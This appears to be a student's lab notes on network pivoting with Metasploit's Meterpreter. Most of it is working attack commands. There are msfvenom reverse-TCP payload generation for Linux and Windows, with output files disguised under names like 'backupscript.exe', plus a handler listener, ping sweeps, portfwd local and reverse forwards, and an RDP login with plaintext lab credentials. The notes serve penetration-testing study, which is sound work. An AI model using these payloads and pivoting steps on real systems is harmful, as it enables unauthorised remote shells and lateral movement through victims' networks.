
Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.

---



```
use exploit/multi/handler
```

Payload generation
```
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
generate the payload andsend the payload on the target host through the ssh session
execute it.


```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
perform a ping sweep on the network

```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
ping sweep from bash
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
ping sweep from cmd

## port forwarding
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.

```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
connect to the windows session through localhost

## meterpreter reverse port forwarding
```
 portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
create a reverse port forward on our existing shell from the previous scenario using the this
command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`.
```
set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
background the session and set the correct payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

